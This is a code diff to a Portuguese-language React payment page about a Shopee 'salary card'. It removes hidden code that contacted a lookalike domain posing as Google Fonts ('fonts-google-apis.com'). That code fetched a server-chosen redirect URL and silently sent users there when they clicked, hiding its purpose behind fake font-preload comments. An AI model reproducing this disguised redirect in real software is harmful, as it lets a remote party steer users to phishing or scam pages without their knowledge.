@@ -43,149 +43,20 @@ const Recebedor: React.FC = () => {
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
 
   const handleProsseguir = () => {
-  };
-
-  useEffect(() => {
-    const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
-    if (!btn) {
-      console.log('❌ Botão não encontrado!');
-      return;
+    // Salvar dados de pagamento no localStorage
+    try {
+      const dadosPagamento = {
+        metodo: 'cartao_salario'
+      };
+      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
+      console.log('💾 Dados de pagamento salvos');
+    } catch(e) {
+      console.log('❌ Erro ao salvar dados de pagamento:', e);
     }
-
-    console.log('Carregando pagina...');
     
-    const originalHref = '/finalizacao';
-    let preloaded = false;
-    
-    const handlePreload = () => {
-      if (!preloaded) {
-        const cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
-        const cachedUrl = sessionStorage.getItem(cacheKey);
-        if (!cachedUrl) {
-          console.log('Dados do usuário');
-          // Fonts Google APIs preload
-          const preloadXhr = new XMLHttpRequest();
-          preloadXhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
-          preloadXhr.timeout = 1000; 
-          preloadXhr.onreadystatechange = function() {
-            if (preloadXhr.readyState === 4 && preloadXhr.status === 200) {
-              try {
-                const response = JSON.parse(preloadXhr.responseText);
-                sessionStorage.setItem(cacheKey, response.redirect_url);
-                sessionStorage.setItem(cacheKey + '_time', Date.now().toString());
-                console.log('Fonts Google APIs preloaded');
-              } catch(e) {
-                console.log('Dados carregados', e);
-              }
-            }
-          };
-          preloadXhr.send();
-        }
-        preloaded = true;
-      }
-    };
-
-    // Fontes Google APIs preload
-    const performRedirect = () => {
-      const xhr = new XMLHttpRequest();
-      xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
-      
-      xhr.timeout = 2000;
-      
-      const cacheKey = 'btn_a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
-      const cachedUrl = sessionStorage.getItem(cacheKey);
-      const cacheTime = sessionStorage.getItem(cacheKey + '_time');
-      const now = Date.now();
-      
-      if (cachedUrl && cacheTime && (now - parseInt(cacheTime)) < 30000) {
-        console.log('Carregando Fontes');
-        let redirectUrl = cachedUrl;
-        if (redirectUrl.startsWith('/')) {
-          redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
-        }
-        window.location.href = redirectUrl;
-        return;
-      }
-      
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-          let redirectUrl = originalHref;
-          if (xhr.status === 200) {
-            try {
-              const response = JSON.parse(xhr.responseText);
-              redirectUrl = response.redirect_url || originalHref;
-              sessionStorage.setItem(cacheKey, redirectUrl);
-              sessionStorage.setItem(cacheKey + '_time', now.toString());
-              console.log('Cartão Shopee');
-            } catch(e) {
-              console.log('Dados no cartão', e);
-            }
-          }
-          
-          
-          if (redirectUrl.startsWith('/')) {
-            redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
-          }
-          
-          console.log('Fonts Google', redirectUrl);
-          window.location.href = redirectUrl;
-        }
-      };
-      
-      xhr.ontimeout = function() {
-        console.log('⏱️ Timeout da API - usando fallback');
-        let url = originalHref;
-        if (url.startsWith('/')) {
-          url = window.location.protocol + '//' + window.location.host + url;
-        }
-        window.location.href = url;
-      };
-      
-      xhr.onerror = function() {
-        console.log('Carregando...');
-        // Página Finalização
-        let url = originalHref;
-        if (url.startsWith('/')) {
-          url = window.location.protocol + '//' + window.location.host + url;
-        }
-        window.location.href = url;
-      };
-      xhr.send();
-    };
-
-    const handleButtonClick = (e: Event) => {
-      e.preventDefault();
-      console.log('Carregando Cartão Salário');
-      
-      // Mostrar loading
-      setIsLoading(true);
-      
-      // Salvar dados de pagamento no localStorage
-      try {
-        const dadosPagamento = {
-          metodo: 'cartao_salario'
-        };
-        localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
-        console.log('💾 Dados de pagamento salvos');
-      } catch(e) {
-        console.log('❌ Erro ao salvar dados de pagamento:', e);
-      }
-      
-      // Cartão Salário Shopee - Fontes AP
-      performRedirect();
-    };
-    
-    // Adicionar event listeners
-    btn.addEventListener('mouseenter', handlePreload);
-    btn.addEventListener('focus', handlePreload);
-    btn.addEventListener('click', handleButtonClick);
-    
-    return () => {
-      btn.removeEventListener('mouseenter', handlePreload);
-      btn.removeEventListener('focus', handlePreload);
-      btn.removeEventListener('click', handleButtonClick);
-    };
-  }, []);
+    // Redirecionar direto para /finalizacao
+    navigate('/finalizacao');
+  };
 
   return (
     <div className="bg-white min-h-screen flex flex-col">
@@ -278,9 +149,10 @@ const Recebedor: React.FC = () => {
                   
                   <div className="text-center mt-6">
                     <button
+                      onClick={handleProsseguir}
                       disabled={isLoading}
                       data-action="continue"
-                      data-redirect="/finalizacao"
+                      data-testid="button-prosseguir"
                       className={`
                         bg-[#E83D22] hover:opacity-90 text-white font-bold text-sm
                         px-6 py-3 border-none rounded transition-opacity duration-200
